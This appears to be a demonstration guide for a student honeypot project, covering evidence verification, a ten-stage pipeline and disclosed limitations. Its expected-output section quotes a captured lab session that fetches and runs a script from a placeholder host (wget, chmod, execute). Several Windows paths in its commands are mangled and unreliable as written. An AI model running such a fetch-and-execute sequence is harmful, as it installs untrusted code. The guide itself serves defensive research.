# Academic demonstration guide: session `42ee73a7cbbd`

This guide is for presenting the adaptive zero-day honeypot to the panel from **saved, hash-verified evidence**. Presenting creates no new network session, runs no attack and enforces nothing.

The display script verifies all evidence first. It prints a section only if every check passes.

## 1. What is shown (ten stages, two independent branches)

| # | Stage | Evidence (paths relative to this folder) | Kind |
|---|---|---|---|
| 1 | Cowrie honeypot | `live/20261112T070531Z-670781/artifacts/raw/cowrie_slice.json`: 14 real Cowrie events from the test-client SSH session | observed |
| 2 | Log collection | the same file. It contains only lines appended after the 21,888-line baseline (log rotation verified); `run_summary.json` → `cowrie_slice` | observed |
| 3 | Session reconstruction | `live/…/artifacts/ml/pipeline/parsed/sessions.json`, `session_details.json` | model pipeline |
| 4 | Feature extraction | `live/…/artifacts/ml/pipeline/parsed/behavior_features.csv` | model pipeline |
| 5 | DEC clustering | `live/…/artifacts/ml/pipeline/processed/dec_results.csv` (saved model, no refit) | model output |
| 6 | Pattern analysis | `live/…/artifacts/ml/behaviour_analysis/` (approved 5-session baseline) | model output |
| 7 | Signature generation | `live/…/artifacts/ml/behaviour_signatures/` | model output |
| 8 | Novelty assessment | `live/…/artifacts/ml/novelty/` | model output |
| 9 | Threat scoring and rules | `assessment/20261112T073151Z-ba1005/artifacts/assessment/` (evidence, assessments, audit) and `input_signed_result_DEMO-…json` | decision |
| 10 | Dynamic response and feedback | `assessment/20261112T073151Z-ba1005/artifacts/response/` (proposal, approval, refused approvals, response audit, feedback record) | **simulated** |

- **ML branch (stages 1–8)** and **rules branch (stages 1→9→10)** both start from the *same* captured bytes (SHA-256 `50c0f942…`).
- DEC and novelty results are **not** inputs to threat scoring. Present them as two parallel analyses of the same session.

## 2. Preparation (5 minutes before)

Run all commands from the repository root in **PowerShell**. Always use the **project interpreter** `.\.venv\Scripts\python.exe`: a plain `python` may be the global Python, which lacks `cryptography` and the project packages. If the venv is activated (`.\.venv\Scripts\Activate.ps1`), `python` also works.

```
cd C:\AMRITA\Final_Year_Project_zero_day_27\adaptive-zero-day-honeypot

# P1  verify the evidence only (28 checks; must end "28/28 checks passed")
.\.venv\Scripts\python.exe reportscademic_demo_readiness_20261112\demo_presentation.py --verify

# P2  optional, in Git Bash: independent manifest checks (every line must say OK)
cd reports/academic_demo_readiness_20261112
sha256sum -c SHA256SUMS
(cd live/20261112T070531Z-670781 && sha256sum -c SHA256SUMS)
(cd assessment/20261112T072217Z-034f7b && sha256sum -c SHA256SUMS)
(cd assessment/20261112T073151Z-ba1005 && sha256sum -c SHA256SUMS)
cd ../..

# P3  maximise the terminal width to at least 120 columns
```

**Do not** run `demo_orchestrator.py live`. **Do not** run anything against `cowrie-demo-test-client` or `cowrie-demo-control-client`.

## 3. Demonstration commands

```
# D1  the full presentation (pre-flight verification, then Sections A–E)
.\.venv\Scripts\python.exe reportscademic_demo_readiness_20261112\demo_presentation.py

# D2  optional, to show raw evidence behind a section
.\.venv\Scripts\python.exe -m json.tool reportscademic_demo_readiness_20261112ssessment61112T073151Z-ba1005rtifactsesponseeedback_record.json
type reports\academic_demo_readiness_20261112\live\20261112T070531Z-670781\artifacts\ml\pipeline\processed\dec_results.csv
```

**D3, optional and only if asked "can it run again?":** the synthetic rehearsal.
```
.\.venv\Scripts\python.exe reportscademic_demo_readiness_20261112\demo_orchestrator.py rehearse
```
- It uses synthetic events and temporary DEMO keys, runs the isolated assessment container (`network_mode: none`), and does a dry-run response.
- It creates **no** network session and ends with "35/35 checks passed".
- It takes about 90 s and writes a new folder under `rehearsal/`. Make clear it is **synthetic**, not the fresh session.

## 4. Expected terminal output

The full expected output is in **`demo_transcript_29f.txt`** (captured in Task 29F). Key lines:

```
  28/28 checks passed
SECTION A - COWRIE INTERACTION           Session ID 42ee73a7cbbd; Login SUCCESS user 'demo'; 5 commands
                                         (uname -a / wget http://files.example/x.sh -O x.sh / chmod +x x.sh / ./x.sh / exit);
                                         duration 10.5 s (Cowrie) / 10.600798 s (reconstructed)
SECTION B - BEHAVIOURAL ANALYSIS         29-column feature table, DEC input 17 features; cluster 1 confidence 0.924;
                                         signature sig-4e22763125d03876; novelty Known-like score 0.774 (threshold 0.7)
SECTION C - THREAT SCORING & RULES       E2; XFER-1 + EXEC-1 action indicators; login_success_observed (signed result);
                                         signature VERIFIED; 10.250.25.3 attributed; gates 1-8 PASS; tier PROPOSE
SECTION D - DYNAMIC RESPONSE             proposal hash 7b1c8307… recomputed OK; 6 refused approvals; approval accepted;
                                         restrict_new_connections on 10.250.25.3/32; enforced=False; rolled_back
SECTION E - FEEDBACK                     feedback_record.json cea0f273…; 19 audit entries intact; enforcement calls []
  ACTUAL_BLOCKING: NOT_EXECUTED
```

**Identifiers.** Identify the response by the **proposal hash `7b1c8307…0648`** and the **signed result `DEMO-20261112T073151Z-ba1005`**. The proposal ID `prop-task26c-isolated-000001` repeats across runs.

## 5. Recovery if the display script fails

| Symptom | Action |
|---|---|
| `VERIFICATION FAILED` | Do **not** present the live output. Show `demo_transcript_29f.txt` and say the verification failed today. Afterwards, find the mismatched file with the P2 commands. Never edit evidence to make it pass |
| `ENVIRONMENT ERROR: No module named 'cryptography'` (or another module) | The global Python was used. Rerun with `.\.venv\Scripts\python.exe reportscademic_demo_readiness_20261112\demo_presentation.py`. Do not `pip install` into the global Python on the day |
| Docker Desktop not running | Not needed. The display script uses no container |
| Garbled or wrapped output | Widen the terminal, or open `demo_transcript_29f.txt` in the editor |
| Any doubt | Present from `demo_transcript_29f.txt` and `report.md` §13–15 |

## 6. Limitations to disclose to the panel

1. **Simulated response.**
   - Dynamic response is **dry-run only**: nothing was blocked, no firewall rule exists (checked 29F), and the enforcement interface is disabled and was never called.
   - Operator verification and rollback are **simulated** records.
   - The assessor's `block_source_ip` is carried out by the controller's only action, `restrict_new_connections` on the demo listener, for the same single target.
2. **Demonstration trust.**
   - Signing keys (attribution result, approver) were **temporary DEMO keys**; production keys are not provisioned, and the checkpoint witness is not deployed (D0 blocked).
   - The relay records were verified with the **real** relay public key.
   - The approver public key was not saved: the approval signature was verified by the controller at run time, and only its hash can be recomputed now.
3. **One controlled session.** The traffic came from the lab test client, not a real attacker; `files.example` was never contacted (Cowrie emulates the commands). The download and execution are **attempts**, not observed successes (EXEC-1 is inferred).
4. **Small ML baseline.**
   - The 5 baseline sessions all sit in DEC cluster 1, so there is one signature. "Known-like" means similar to that single profile.
   - The V1 columns `attack_cat` and `label` are extractor defaults.
   - The auxiliary MinMax output (`model_input.csv`) is all zeros for one session and is not used by DEC.
5. **Independent branches.** DEC and novelty do not feed threat scoring; that is the current design, not an omission in this demonstration.
6. **Exclusion.** The session is excluded from all datasets, training and evaluation (exclusions v2.0.0). It was processed by the rules branch only through a single-ID, demo-only exception inside `demo_orchestrator.py`.
7. **Working-tree code.** `scripts/parse_logs.py` and `scripts/extract_features.py` carry uncommitted edits. Their hashes (`4987a671…`, `6524aedf…`) were recorded and were unchanged throughout.
8. **Log collection.** Collection used a line-boundary slice instead of `collect_logs.py`, which would copy the whole historical log. Cowrie's daily rotation happened during the run and was verified.

## 7. Files in this folder

| File | Purpose |
|---|---|
| `demo_presentation.py` | read-only verification and display (this demonstration) |
| `demo_transcript_29f.txt` | captured expected output (fallback) |
| `demo_orchestrator.py` | the orchestrator that produced the evidence (rehearse / live / assess) |
| `report.md` | full record (Tasks 29A–29F; §12–16) |
| `final_validation_29f/` | 29F firewall check and test-suite result |
| `SHA256SUMS` | top-level manifest (each evidence folder has its own) |
